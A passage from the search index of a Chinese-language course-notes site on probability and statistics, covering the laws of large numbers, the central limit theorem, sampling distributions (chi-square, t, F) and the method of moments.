<p>\u4ea6\u53ef\u5199\u4f5c\uff1a</p> \\[ P\\{|X-\\mu| \\lt \\varepsilon\\} \\ge 1- \\frac{\\sigma^2 }{\\varepsilon^2} \\] <p>\u5bf9\u6837\u672c\u5747\u503c\u4f7f\u7528\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\uff0c\u7531\u4e8e \\(D(\\bar{X})= \\frac{\\sigma^2}{n}\\)\uff0c\u5219 \\(P\\{|\\bar{X}-\\mu| \\ge \\varepsilon\\} \\le \\frac{\\sigma^2 }{n\\varepsilon^2}\\)</p> <p>\u4f8b 1\uff1a</p> <p>\u9898\u9762\uff1a \u603b\u4f53\u670d\u4ece\u6307\u6570\u5206\u5e03 \\(E(0.1)\\)\uff0c\u62bd\u53d6\u4e00\u4e2a\u5bb9\u91cf\u4e3a 5 \u7684\u6837\u672c\uff0c\u6839\u636e\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\u6765\u4f30\u8ba1\uff1a</p> \\[ P\\{ |\\bar{X} -10| \\ge 10\\} \\le \\frac{1}{n\\varepsilon^2 \\lambda^2} = \\frac{1}{5} \\]"},{"location":"Courses/PS/CH5/#_6","title":"\u4e09\u4e2a\u5927\u6570\u5b9a\u5f8b","text":"<p>\u8bbe \\(\\{X_i, i\\ge 1\\}\\) \u4e3a\u4e00\u968f\u673a\u53d8\u91cf\u5e8f\u5217\uff0c\u82e5\u5b58\u5728\u5e38\u6570\u5e8f\u5217 \\(\\{c_n, n\\ge 1\\}\\) \u4f7f\u5f97\u5bf9\u4e8e\u4efb\u610f \\(\\varepsilon \\gt 0\\) \u6709\u4ee5\u4e0b\u6210\u7acb\uff1a</p> \\[ \\lim _{n\\rightarrow +\\infty} P\\{|\\frac{1}{n}\\sum_{i=1} ^n X_i -c_n|\\ge \\varepsilon \\} = 0 \\] <p>\u5373 \\(n\\rightarrow +\\infty\\) \u65f6\uff0c\u6709 \\(\\frac{1}{n}\\sum_{i=1}^n X_i -c_n \\xrightarrow p 0\\) \uff0c\u5219\u79f0\u968f\u673a\u53d8\u91cf\u5e8f\u5217 \\(\\{X_i, i\\ge 1\\}\\) \u670d\u4ece\u5f31\u5927\u6570\u5b9a\u5f8b\uff0c\u7b80\u79f0\u5927\u6570\u5b9a\u5f8b\u3002</p> <p>\u5b9e\u8df5\u4e2d , \u4eba\u4eec\u53d1\u73b0\u5927\u91cf\u6d4b\u91cf\u503c\u7684\u7b97\u672f\u5e73\u5747\u5177\u6709\u4e00\u5b9a\u7684\u7a33\u5b9a\u6027, \u8fd9\u4e00\u7a33\u5b9a\u6027\u5176\u5b9e\u5c31\u662f\u5927\u6570\u5b9a\u5f8b\u7684\u5ba2\u89c2\u80cc\u666f. \u6700\u65e9\u7684\u5927\u6570\u5b9a\u5f8b\u662f\u8457\u540d\u7684\u4f2f\u52aa\u5229\u5927\u6570\u5b9a\u5f8b\u3002</p> <p>[\u5b9a\u4e49] \u4f2f\u52aa\u5229\u5927\u6570\u5b9a\u5f8b\uff1a</p> <p>\u8bbe \\(n_A\\) \u4e3a \\(n\\) \u91cd\u4f2f\u52aa\u5229\u8bd5\u9a8c\u4e2d\u4e8b\u4ef6 \\(A\\) \u7684\u53d1\u751f\u6b21\u6570\uff0c\\(p\\) \u4e3a\u5176\u6bcf\u6b21\u8bd5\u9a8c\u4e2d\u53d1\u751f\u7684\u6982\u7387\uff0c\u5219\u5bf9\u4efb\u610f \\(\\varepsilon \\gt 0\\) \u6709\uff1a</p> \\[\\begin{array}c \\lim _{n\\rightarrow +\\infty} P\\{|\\frac{n_A}{n}-p| \\ge \\varepsilon\\} =0 \\\\  \\Rightarrow \\frac{n_A}{n} \\xrightarrow P p \\end{array}\\] <p>\\(n_A/n\\) \u5373\u4e8b\u4ef6A\u7684\u9891\u7387</p> <p>[\u5b9a\u4e49] \u5207\u6bd4\u96ea\u592b\u5927\u6570\u5b9a\u5f8b\uff1a</p> <p>\u8bbe \\(X_1, X_2, ...,X_n\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5177\u6709\u76f8\u540c\u6570\u5b66\u671f\u671b \\(\\mu\\) \u548c\u65b9\u5dee \\(\\sigma^2\\) \u3002\u5219\u5f53 \\(n\\rightarrow \\infty\\) \u65f6\uff1a</p> \\[ \\frac{1}{n}\\sum_{k=1}^n X_k \\xrightarrow P \\mu \\] <p>[\u5b9a\u4e49] \u8f9b\u94a6\u5927\u6570\u5b9a\u5f8b\uff1a</p> <p>\u8bbe \\(X_1, X_2, ...,X_n\\) \u72ec\u7acb\u540c\u5206\u5e03\uff0c\u4e14 \\(E(X_i) =\\mu\\) \uff0c\u5219\u5f53 \\(n\\rightarrow \\infty\\) \u65f6\uff1a</p> \\[ \\frac{1}{n}\\sum_{k=1}^n X_k \\xrightarrow P \\mu \\] <p>\u4e0d\u662f\u7b80\u5355\u7684\u5207\u6bd4\u96ea\u592b\u5927\u6570\u5b9a\u5f8b\u7684\u7279\u4f8b\uff0c\u56e0\u4e3a\u65b9\u5dee\u53ef\u80fd\u4e0d\u5b58\u5728</p> <p>\u4f8b 1\uff1a</p> <p>\u8bbe \\(X_1, X_2, ...,X_n\\) \u72ec\u7acb\u540c\u5206\u5e03\uff0c\u4e14 \\(X_i\\sim U(0,1)\\)\uff0c\u5219 \\(\\sqrt[n]{X_1 X_2 ...X_n}\\) \u4f9d\u6982\u7387\u6536\u655b\u5417?</p> <p>\u89e3\u7b54\uff1a</p> <p>\u4ee4 \\(Y_n = \\sqrt[n]{X_1 X_2 ...X_n}, \\ Z_n =\\ln Y_n\\) \uff0c\u5219 \\(Z_n= \\frac{1}{n}(\\ln X_1 +.. +\\ln X_n)\\)</p> \\[ E(\\ln X_n)= \\int ^1_0 \\ln xdx= -1 \\] <p>\u6839\u636e\u8f9b\u94a6\u5927\u6570\u5b9a\u5f8b\u53ef\u5f97 \\(Z_n \\xrightarrow p -1\\) \uff0c\u7531\u4f9d\u6982\u7387\u6536\u655b\u7684\u6027\u8d28\u5f97\u5230 \\(Y_n \\xrightarrow p e^{-1}\\)</p>"},{"location":"Courses/PS/CH5/#_7","title":"\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406","text":"<p>[\u5b9a\u4e49] \u72ec\u7acb\u540c\u5206\u5e03\u7684\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406\uff1a</p> <p>\u8bbe \\(X_1, X_2, ...,X_n\\) \u72ec\u7acb\u540c\u5206\u5e03\uff0c\\(E(X_i)=\\mu, D(X_i)=\\sigma^2\\)\uff0c\u5219\u5bf9\u4efb\u610f\u5b9e\u6570 \\(x\\) :</p> \\[ \\lim _{n\\rightarrow \\infty} P(\\frac{\\sum_{i=1}^n X_i-n\\mu }{\\sqrt{n} \\sigma}\\le x)=\\int ^x_{-\\infty} \\frac{1}{\\sqrt{2\\pi}}e^{-\\frac{t^2}{2}}dt = \\Phi(x) \\] <p>\u56e0\u6b64\uff0c\u5f53 \\(n\\) \u5145\u5206\u5927\u65f6:</p> \\[\\begin{array}c \\sum _{i=1}^n X_i \\sim N(n\\mu, n\\sigma ^2) \\\\ \\frac{1}{n}\\sum _{i=1}^n X_i \\sim N(\\mu, \\sigma ^2/n) \\end{array}\\] <p>[\u63a8\u8bba] \u96b6\u83ab\u5f17-\u62c9\u666e\u62c9\u65af\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406\uff1a</p> <p>\u8bbe \\(n_A\\) \u4e3a\u5728 n \u91cd\u4f2f\u52aa\u5229\u8bd5\u9a8c\u4e2d\u4e8b\u4ef6 \\(A\\) \u53d1\u751f\u7684\u6b21\u6570\uff0c\\(p\\) \u4e3a\u4e8b\u4ef6 \\(A\\) \u5728\u6bcf\u6b21\u8bd5\u9a8c\u4e2d\u53d1\u751f\u7684\u6982\u7387\uff0c\u5373 \\(P(A)=p\\)\uff0c\u5219\u5bf9\u4efb\u610f \\(x\\in R\\) \uff1a</p> \\[ \\lim_{n\\rightarrow \\infty} P(\\frac{n_A -np}{\\sqrt{np(1-p)}}\\le x)=\\int ^x_{-\\infty} \\frac{1}{\\sqrt{2\\pi}}e^{-\\frac{t^2}{2}}dt = \\Phi(x) \\] <p>\u5373\uff0c\u5f53 \\(n\\) \u8db3\u591f\u5927\u65f6\uff1a</p> \\[ B(n,p)\\sim N(np, np(1-p)) \\]"},{"location":"Courses/PS/CH6/","title":"\u6570\u7406\u7edf\u8ba1\u7684\u57fa\u672c\u6982\u5ff5","text":""},{"location":"Courses/PS/CH6/#_1","title":"\u6570\u7406\u7edf\u8ba1\u7684\u57fa\u672c\u6982\u5ff5","text":"<p> \u7ea6 1623 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>\u6570\u7406\u7edf\u8ba1\u5b66\u662f\u4e00\u95e8\u4ee5\u6570\u636e\u4e3a\u57fa\u7840\u7684\u79d1\u5b66\uff0c\u53ef\u4ee5\u5b9a\u4e49\u4e3a\u6536\u96c6\u6570\u636e\u3001\u5206\u6790\u6570\u636e\u548c\u7531\u6570\u636e\u5f97\u51fa\u7ed3\u8bba\u7684\u4e00\u7ec4\u6982\u5ff5\u3001\u539f\u5219\u548c\u65b9\u6cd5\u3002</p> <p>\u4f8b\u5982\uff0c\u89c4\u5b9a\u706f\u6ce1\u5bff\u547d\u4f4e\u4e8e 1000h \u7684\u4e3a\u6b21\u54c1\uff0c\u5982\u4f55\u786e\u5b9a\u4ea7\u54c1\u7684\u6b21\u54c1\u7387\uff1f\u7531\u4e8e\u706f\u6ce1\u5bff\u547d\u662f\u7834\u574f\u6027\u8bd5\u9a8c\uff0c\u4e0d\u53ef\u80fd\u628a\u6574\u6279\u706f\u6ce1\u9010\u4e00\u68c0\u6d4b\uff0c\u53ea\u80fd\u62bd\u53d6\u4e00\u90e8\u5206\u4f5c\u4e3a\u6837\u672c\u8fdb\u884c\u68c0\u9a8c\u3002\u4ee5\u6837\u672c\u7684\u4fe1\u606f\u6765\u63a8\u65ad\u603b\u4f53\u7684\u4fe1\u606f\uff0c\u8fd9\u662f\u6570\u7406\u7edf\u8ba1\u5b66\u7814\u7a76\u7684\u95ee\u9898\u4e4b\u4e00\u3002</p>"},{"location":"Courses/PS/CH6/#_2","title":"\u968f\u673a\u6837\u672c\u548c\u7edf\u8ba1\u91cf","text":"<ul> <li>\u603b\u4f53\uff1a \u7814\u7a76\u5bf9\u8c61\u7684\u5168\u4f53 population</li> <li>\u4e2a\u4f53\uff1a \u603b\u4f53\u4e2d\u7684\u6210\u5458</li> <li>\u603b\u4f53\u5bb9\u91cf\uff1a \u603b\u4f53\u4e2d\u5305\u542b\u7684\u4e2a\u4f53\u6570\u91cf</li> <li>\u6709\u9650\u603b\u4f53\uff1a \u5bb9\u91cf\u6709\u9650\u7684\u603b\u4f53</li> <li>\u65e0\u9650\u603b\u4f53\uff1a \u5bb9\u91cf\u65e0\u9650\u7684\u603b\u4f53<ul> <li>\u901a\u5e38\u5c06\u5bb9\u91cf\u975e\u5e38\u5927\u7684\u603b\u4f53\u4e5f\u5f53\u4f5c\u65e0\u9650\u603b\u4f53\u5904\u7406</li> </ul> </li> </ul> <p>\u603b\u4f53\u7684\u67d0\u4e2a\u6307\u6807 \\(X\\) \u5bf9\u4e8e\u4e0d\u540c\u4e2a\u4f53\u6765\u8bf4\u53ef\u80fd\u6709\u4e0d\u540c\u53d6\u503c\uff0c\u8fd9\u4e9b\u53d6\u503c\u53ef\u4ee5\u6784\u6210\u4e00\u4e2a\u5206\u5e03\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06 \\(X\\) \u770b\u4f5c\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\u3002\u5047\u8bbe \\(X\\) \u7684\u5206\u5e03\u51fd\u6570\u4e3a \\(F(X)\\) \uff0c\u6211\u4eec\u53ef\u79f0 \\(X\\) \u6216 \\(F(X)\\) \u4e3a\u603b\u4f53\u3002</p> <p>\u5982\u679c\u6211\u4eec\u5173\u5fc3\u603b\u4f53\u7684\u591a\u4e2a\u6307\u6807\uff0c\u5219\u53ef\u4ee5\u7528\u591a\u7ef4\u968f\u673a\u53d8\u91cf \\((X_1, X_2,..., X_d)\\) \u6765\u8868\u793a\u603b\u4f53\u3002</p> <p>\u6570\u7406\u7edf\u8ba1\u7684\u4e3b\u8981\u4efb\u52a1\u662f\u4ece\u603b\u4f53\u4e2d\u62bd\u53d6\u4e00\u90e8\u5206\u4e2a\u4f53\uff0c\u6839\u636e\u8fd9\u90e8\u5206\u4e2a\u4f53\u7684\u6570\u636e\u5bf9\u603b\u4f53\u5206\u5e03\u6216\u5176\u4e2d\u7684\u4f4d\u7f6e\u53c2\u6570\u7ed9\u51fa\u63a8\u65ad\uff0c\u88ab\u62bd\u53d6\u7684\u90e8\u5206\u4e2a\u4f53\u88ab\u79f0\u4e3a\u603b\u4f53\u7684\u4e00\u4e2a\u6837\u672c\uff0c\u88ab\u62bd\u53d6\u7684\u4e2a\u4f53\u6570\u91cf\u79f0\u4e3a\u6837\u672c\u5bb9\u91cf\u3002</p> <ul> <li>\u968f\u673a\u6837\u672c\uff1a \u4ece\u603b\u4f53\u4e2d\u968f\u673a\u53d6n\u4e2a\u4e2a\u4f53\uff0c\u79f0\u4e3a\u4e00\u4e2a\u968f\u673a\u6837\u672c</li> <li>\u7b80\u5355\u968f\u673a\u6837\u672c\uff1a \u6ee1\u8db3\u4ee5\u4e0b\u4e24\u4e2a\u6761\u4ef6\u7684\u968f\u673a\u6837\u672c \\((X_1, X_2, ...,X_n)\\) \u79f0\u4e3a\u5bb9\u91cf\u662f n \u7684\u7b80\u5355\u968f\u673a\u6837\u672c<ul> <li>&lt;1, \u4ee3\u8868\u6027&gt; \u6bcf\u4e2a \\(X_i\\) \u4e0e \\(X\\) \u540c\u5206\u5e03</li> <li>&lt;2, \u72ec\u7acb\u6027&gt; \\(X_1, X_2, ...,X_n\\) \u662f\u76f8\u4e92\u72ec\u7acb\u7684\u968f\u673a\u53d8\u91cf</li> </ul> </li> </ul> <p>\u5982\u679c\u603b\u4f53\u7684\u5206\u5e03\u51fd\u6570\u4e3a \\(F(x)\\)\uff0c\u90a3\u4e48\u6839\u636e\u4ee5\u4e0a\u5b9a\u4e49\uff0c\u6837\u672c\u7684\u8054\u5408\u5206\u5e03\u51fd\u6570\u4e3a\uff1a</p> \\[ F_n( x_1, x_2, ..., x_n)=\\prod _{i=1}^n F(x_i) \\] <p>\u5982\u679c\u603b\u4f53\u5177\u6709\u8fde\u7eed\u578b\u5206\u5e03\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(f(x)\\) \uff0c\u90a3\u4e48\u6837\u672c\u7684\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\u4e3a\uff1a</p> \\[ f_n( x_1, x_2, ..., x_n)=\\prod _{i=1}^n f(x_i) \\] <p>[\u5b9a\u4e49] \u8bbe \\(X_1, X_2, ..., X_n\\) \u662f\u6765\u81ea\u603b\u4f53 \\(X\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\\(g(X_1, X_2,..., X_n)\\) \u662f\u6837\u672c\u7684\u51fd\u6570\uff0c\u82e5 \\(g\\) \u4e0d\u5305\u542b\u672a\u77e5\u53c2\u6570\uff0c\u5219\u79f0 \\(g(X_1, X_2,..., X_n)\\) \u662f\u4e00\u7edf\u8ba1\u91cf\u3002</p> <p>\u5728\u7edf\u8ba1\u5b66\u4e2d\uff0c\u6839\u636e\u4e0d\u540c\u76ee\u7684\u6709\u4ee5\u4e0b\u91cd\u8981\u7edf\u8ba1\u91cf\uff1a</p> <ul> <li>\u6837\u672c\u5747\u503c<ul> <li>\\(\\bar{X}=\\frac{1}{n}\\sum _{i=1}^n X_i\\)</li> <li>\\(E(\\bar{X}) = E(X), \\ \\ D(\\bar{X}) = \\frac{1}{n}D(X)\\)</li> </ul> </li> <li>\u6837\u672c\u65b9\u5dee<ul> <li>\\(S^2= \\frac{1}{n-1}\\sum_{i=1} ^n (X_i-\\bar{X})^2 = \\frac{1}{n-1}\\left (\\sum_{i=1} ^n X_i^2 -n\\bar{X}^2 \\right)\\)</li> <li>\\(E(S^2) = D(X)\\)</li> </ul> </li> <li>\u6837\u672c\u6807\u51c6\u5dee<ul> <li>\\(S=\\sqrt{S^2}\\)</li> </ul> </li> <li>\u6837\u672ck\u9636(\u539f\u70b9)\u77e9<ul> <li>\\(A_k =\\frac{1}{n}\\sum_{i=1} ^n X_i^k\\)</li> </ul> </li> <li>\u6837\u672ck\u9636\u4e2d\u5fc3\u77e9<ul> <li>\\(B_k =\\frac{1}{n} \\sum_{i=1} ^n (X_i- \\bar{X})^k\\)</li> </ul> </li> </ul> <p>\u5176\u4e2d\uff0c\u603b\u4f53\u65b9\u5dee\u7684\u4f30\u8ba1\u53ef\u4ee5\u7528 \\(S^2\\) \u6216 \\(B_2\\) \uff0c\u533a\u522b\u5728\u4e8e\u4ee5\u6837\u672c\u65b9\u5dee\u4f5c\u4e3a\u603b\u4f53\u65b9\u5dee\u4f30\u8ba1\u662f\u65e0\u504f\u4f30\u8ba1\uff0c\u4f46\u4ee52\u9636\u4e2d\u5fc3\u8ddd\u4f5c\u4e3a\u603b\u4f53\u65b9\u5dee\u4f30\u8ba1\u662f\u6709\u504f\u4f30\u8ba1\u3002</p> <p>\u7edf\u8ba1\u91cf\u90fd\u662f\u968f\u673a\u53d8\u91cf\uff0c\u6bcf\u6b21\u89c2\u5bdf\u6240\u5f97\u5230\u7684\u503c\u53ef\u80fd\u4e0d\u76f8\u540c\u3002\u4f46\u662f\u603b\u4f53\u7684\u6570\u5b57\u7279\u5f81\u662f\u4e00\u4e2a\u5b9a\u503c\uff0c\u8fd9\u662f\u4e8c\u8005\u4e4b\u95f4\u7684\u4e3b\u8981\u533a\u522b\u3002</p> <p>\u5bf9\u4e8e\u6b63\u6001\u62bd\u6837\uff0c\u6837\u672c\u5747\u503c\u548c\u6837\u672c\u65b9\u5dee\u72ec\u7acb</p>"},{"location":"Courses/PS/CH6/#_3","title":"\u91cd\u8981\u62bd\u6837\u5206\u5e03","text":""},{"location":"Courses/PS/CH6/#chi2","title":"\\(\\chi^2\\) \u5206\u5e03","text":"<p>\u8bbe \\(X_1, X_2,..., X_n\\) \u4e3a\u72ec\u7acb\u540c\u5206\u5e03\u7684\u968f\u673a\u53d8\u91cf\uff0c\u4e14\u90fd\u670d\u4ece\u6b63\u6001\u5206\u5e03 \\(N(0,1)\\) (\u6807\u51c6\u6b63\u6001\u5206\u5e03)\uff0c\u8bb0:</p> \\[ Y=\\sum _{i=1}^n X_i^2 \\] <p>\u79f0 \\(Y\\) \u670d\u4ece\u81ea\u7531\u5ea6\u4e3a \\(n\\) \u7684 \\(\\chi^2\\) \u5206\u5e03\uff0c\u8bb0\u4e3a \\(Y\\sim \\chi^2(n)\\)\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u4e3a\uff1a</p> \\[ f_{\\chi^2} (x)=\\begin{cases} \\frac{1}{2^{n / 2}\\Gamma(n / 2)}x^{\\frac{n}{2}-1} e^{-\\frac{x}{2}}, &amp; x\\gt 0\\\\ 0, &amp; \\text{\u5176\u4ed6} \\end{cases} \\] <p>\u5bc6\u5ea6\u51fd\u6570\u4e0d\u7528\u8bb0\uff0c\u77e5\u9053\u5927\u6982\u6837\u5b50\u5373\u53ef</p> <p>\u81ea\u7531\u5ea6\u4e3a\u968f\u673a\u53d8\u91cf\u72ec\u7acb\u7684\u4e2a\u6570</p> <p></p> <ul> <li>&lt;1&gt; \u53ef\u52a0\u6027\uff1a\u76f8\u4e92\u72ec\u7acb\u7684 \\(\\chi^2\\) \u5206\u5e03 \\(Y_1\\sim \\chi^2(m), Y_2\\sim \\chi^2(n)\\)<ul> <li>\\(Y_1+ Y_2\\sim \\chi^2 (m+n)\\)</li> </ul> </li> <li>&lt;2&gt; \u6570\u5b66\u7279\u5f81\uff1a \\(Y\\sim \\chi^2(n)\\)<ul> <li>\\(E(Y)=n, Var(Y)=2n\\)</li> </ul> </li> <li>&lt;3&gt; \u5206\u4f4d\u6570\uff1a\u7ed9\u5b9a\u6574\u6570 \\(0\\lt \\alpha \\lt 1\\)<ul> <li>\u6ee1\u8db3\u6761\u4ef6 \\(P(\\chi^2 \\gt \\chi_\\alpha ^2(n))=\\int _{\\chi^2 _\\alpha(n)} ^{+\\infty} f_{\\chi^2}(x)dx =\\alpha\\) \u7684 \\(\\chi_\\alpha^2(n)\\) \u4e3a \\(\\chi^2(n)\\) \u5206\u5e03\u4e0a \\(\\alpha\\) \u5206\u4f4d\u6570</li> <li>\u4f7f\u7528\u65f6\u67e5\u8868\u5373\u53ef</li> </ul> </li> </ul>"},{"location":"Courses/PS/CH6/#t","title":"t \u5206\u5e03","text":"<p>\u8bbe\u76f8\u4e92\u72ec\u7acb\u7684\u53d8\u91cf \\(X\\sim N(0,1), Y\\sim \\chi^2(n)\\) \uff0c \u5219\u79f0\u968f\u673a\u53d8\u91cf\uff1a</p> \\[ t= \\frac{X}{\\sqrt{Y/n}}\\] <p>\u4e3a\u81ea\u7531\u5ea6\u4e3a \\(n\\) \u7684 t \u5206\u5e03\uff0c\u8bb0\u4e3a \\(t\\sim t(n)\\)</p> <p>t \u5206\u5e03\u7684\u5bc6\u5ea6\u51fd\u6570\u540c\u6837\u4e0d\u7528\u8bb0\uff0c\u4f46\u662f\u8981\u77e5\u9053\u957f\u4ec0\u4e48\u6837\uff1a</p> <p></p> <ul> <li>&lt;1&gt; t \u5206\u5e03\u7684\u5bc6\u5ea6\u51fd\u6570\u662f\u5076\u51fd\u6570\uff0c\u5173\u4e8e y \u8f74\u5bf9\u79f0</li> <li>&lt;2&gt; \u5f53 n \u8db3\u591f\u5927\u65f6(\\(\\ge 45\\))\uff0ct \u5206\u5e03\u8fd1\u4f3c\u4e8e\u6807\u51c6\u6b63\u6001\u5206\u5e03 \\(N(0,1)\\)</li> <li>&lt;3&gt; \u5206\u4f4d\u6570\uff1a\u540c\u6837\u67e5\u8868<ul> <li>\\(t_{1-\\alpha}(n) = -t_\\alpha (n)\\)</li> </ul> </li> </ul>"},{"location":"Courses/PS/CH6/#f","title":"F \u5206\u5e03","text":"<p>\u8bbe\u72ec\u7acb\u53d8\u91cf \\(U\\sim \\chi^2(n_1), V\\sim \\chi^2 (n_2)\\) \uff0c\u5219\u79f0\u968f\u673a\u53d8\u91cf\uff1a</p> \\[ F= \\frac{ U / n_1}{ V / n_2 } \\] <p>\u4e3a\u670d\u4ece\u7b2c\u4e00\u81ea\u7531\u5ea6\u4e3a \\(n_1\\) \uff0c\u7b2c\u4e8c\u81ea\u7531\u5ea6\u4e3a \\(n_2\\) \u7684 F \u5206\u5e03\uff0c\u8bb0\u4e3a \\(F\\sim F(n_1, n_2)\\)</p> <p></p> <ul> <li>&lt;1&gt; \\(F\\sim F(n_1, n_2) \\ \\Rightarrow \\frac{1}{F} \\sim F(n_2, n_1)\\)</li> <li>&lt;2&gt; \u82e5 \\(X\\sim t(n)\\) \uff0c\u5219 \\(X^2 \\sim F(1,n)\\)</li> <li>&lt;3&gt; \u5206\u4f4d\u6570 : \u540c\u6837\u67e5\u8868\uff0c\u4f46\u8981\u6ce8\u610f \\(F_{1-\\alpha}(n_1, n_2) = \\frac{1}{F_\\alpha( n_2, n_1)}\\)<ul> <li>\u5bf9\u4e8e\u8f83\u5927\u7684\u5206\u4f4d\u6570\uff0c\u901a\u5e38\u5229\u7528\u8fd9\u4e2a\u516c\u5f0f\u8ba1\u7b97</li> </ul> </li> </ul>"},{"location":"Courses/PS/CH6/#_4","title":"\u6b63\u6001\u6574\u4f53\u4e0b\u7684\u62bd\u6837\u5206\u5e03","text":"<ul> <li>&lt;1&gt; \\(\\bar{X}\\sim N(\\mu, \\frac{\\sigma^2}{n})\\)</li> <li>&lt;2&gt; \\(\\frac{\\sum_{i=1}^n (X_i- \\bar{X})^2}{\\sigma ^2} =\\frac{(n-1)S^2}{ \\sigma^2}\\sim \\chi^2 (n-1)\\) <ul> <li>\\(\\frac{(n-1)^2 D(S^2)}{ \\sigma^4} = 2(n-1)\\Rightarrow D(S^2) =\\frac{2\\sigma^4}{n-1}\\)</li> <li>\\(\\frac{\\sum_{i=1}^n (X_i- \\mu)^2}{\\sigma ^2} = \\chi^2 (n)\\)</li> </ul> </li> <li>&lt;3&gt; \\(\\bar{X}\\) \u548c \\(S^2\\) \u76f8\u4e92\u72ec\u7acb</li> <li>&lt;4&gt; \\(\\frac{\\bar{X}-\\mu}{ S / \\sqrt{n}  } \\sim t(n-1)\\)</li> </ul> \u4e00\u70b9\u7b80\u5355\u7684\u8bc1\u660e <p>\u8bbe \\(X_1, X_2, ..., X_{ n_1}\\) \u548c \\(Y_1, Y_2, ..., Y_{ n_2}\\) \u5206\u522b\u4e3a\u6765\u81ea\u4e8e\u6b63\u6001\u603b\u4f53 \\(N(\\mu_1, \\sigma_1^2)\\) \u548c \\(N(\\mu_2, \\sigma_2^2)\\) \u7684\u4e24\u4e2a\u76f8\u4e92\u72ec\u7acb\u7684\u7b80\u5355\u968f\u673a\u6837\u672c\uff0c\u5219\u5b83\u4eec\u7684\u6837\u672c\u65b9\u5dee\u548c\u6837\u672c\u5747\u503c\u6709\u5982\u4e0b\u5173\u7cfb\uff1a</p> \\[\\begin{array}c (1) &amp; \\frac{S_1^2}{ S_2^2} / \\frac{\\sigma_1^2 }{ \\sigma_2^2}\\sim F(n_1 -1, n_2-1) \\\\ (2) &amp; \\frac{(\\bar{X} - \\bar{Y})- (\\mu_1 -\\mu_2)}{\\sqrt{\\frac{\\sigma_1 ^2}{n_1} + \\frac{\\sigma_2^2}{ n_2}}} \\sim N(0,1) \\end{array}\\] <p>\u5f53 \\(\\sigma_1^2 = \\sigma_2^2 = \\sigma^2\\) \u65f6\uff1a</p> \\[\\begin{array}l \\frac{(\\bar{X}-\\bar{Y})- (\\mu_1 -\\mu_2)}{ S_\\omega \\sqrt{\\frac{1}{n_1} + \\frac{1}{n_2}}} \\sim t(n_1 +n_2 -2) \\\\ S_\\omega^2= \\frac{(n_1 -1) S_1^2 +(n_2-1) S_2^2}{ n_1+ n_2 -2} \\end{array}\\] <p>\\(S_\\omega\\) \u5176\u5b9e\u5c31\u662f\u4e24\u4e2a\u6837\u672c\u65b9\u5dee\u6309\u7167\u81ea\u7531\u5ea6\u7684\u52a0\u6743\u5e73\u5747</p>"},{"location":"Courses/PS/CH7/","title":"\u53c2\u6570\u4f30\u8ba1","text":""},{"location":"Courses/PS/CH7/#_1","title":"\u53c2\u6570\u4f30\u8ba1","text":"<p> \u7ea6 3812 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 19 \u5206\u949f</p>"},{"location":"Courses/PS/CH7/#_2","title":"\u70b9\u4f30\u8ba1","text":"<p>\u8bbe\u603b\u4f53\u7684\u5206\u5e03\u51fd\u6570\u4e3a \\(F(x;\\theta)\\) \uff0c\u70b9\u4f30\u8ba1\u95ee\u9898\u901a\u8fc7\u6784\u9020\u4e00\u4e2a\u9002\u5f53\u7684\u7edf\u8ba1\u91cf \\(\\hat{\\theta} (X_1, X_2,..., X_n)\\) \u6765\u4f30\u8ba1\u603b\u4f53\u7684\u53c2\u6570 \\(\\theta\\) \u3002\u6211\u4eec\u79f0  \\(\\hat{\\theta} (X_1, X_2,..., X_n)\\) \u4e3a \\(\\theta\\) \u7684\u70b9\u4f30\u8ba1\u91cf\uff0c\u82e5\u4ee5\u5177\u4f53\u503c\u5e26\u5165\uff0c\u5219\u79f0 \\(\\hat{\\theta} (x_1, x_2,..., x_n)\\) \u4e3a \\(\\theta\\) \u7684\u4e00\u4e2a\u4f30\u8ba1\u503c\u3002</p>"},{"location":"Courses/PS/CH7/#_3","title":"\u77e9\u6cd5","text":"<p>\u4f9d\u636e\u5927\u6570\u5b9a\u5f8b\uff0c\u5373\u5f53\u6837\u672c\u5bb9\u91cf \\(n\\rightarrow +\\infty\\) \u65f6\uff0c\u6837\u672c\u77e9\u4f9d\u6982\u7387\u6536\u655b\u4e8e\u76f8\u5e94\u7684\u603b\u4f53\u77e9\uff0c\u5373\uff1a</p> \\[ A_k \\xrightarrow p \\mu_k, \\ B_k \\xrightarrow p v_k \\] <p>\u5176\u4e2d \\(A_k, B_k\\) \u5206\u522b\u4e3a\u6837\u672c\u7684k\u9636\u539f\u70b9\u77e9\u548ck\u9636\u4e2d\u5fc3\u77e9\uff0c\\(\\mu_k, v_k\\) \u5206\u522b\u4e3a\u603b\u4f53\u7684k\u9636\u539f\u70b9\u77e9\u548ck\u9636\u4e2d\u5fc3\u77e9\u3002</p> <p>\u5229\u7528\u77e9\u6cd5\u8ba1\u7b97\u53c2\u6570\u4f30\u8ba1\u91cf\u7684\u57fa\u672c\u6b65\u9aa4\u4e3a\uff1a</p> <p>&lt;1&gt; \u6c42\u77e9\u5173\u4e8e\u53c2\u6570\u7684\u51fd\u6570\uff1a</p> \\[ \\mu_i = E(X^i) =h_i( \\theta_1,..., \\theta_k),\\ \\  i=1,...,k \\] <p>&lt;2&gt; \u6c42\u5404\u53c2\u6570\u5173\u4e8ek\u9636\u77e9\u7684\u53cd\u51fd\u6570\uff1a</p> \\[ \\theta_i= g_i( \\mu_1, ...,\\mu_k),\\ i=1,...,k \\] <p>&lt;3&gt; \u4ee5\u6837\u672c\u5404\u9636\u77e9 \\(A_1,... ,A_k\\) \u4ee3\u66ff\u603b\u4f53\u5404\u9636\u77e9 \\(\\mu_1, ..., \\mu_k\\) \u8ba1\u7b97\u5404\u53c2\u6570\u7684\u77e9\u4f30\u8ba1\uff1a</p> \\[ \\hat{\\theta} = g_i( A_1, ..., A_k) \\] 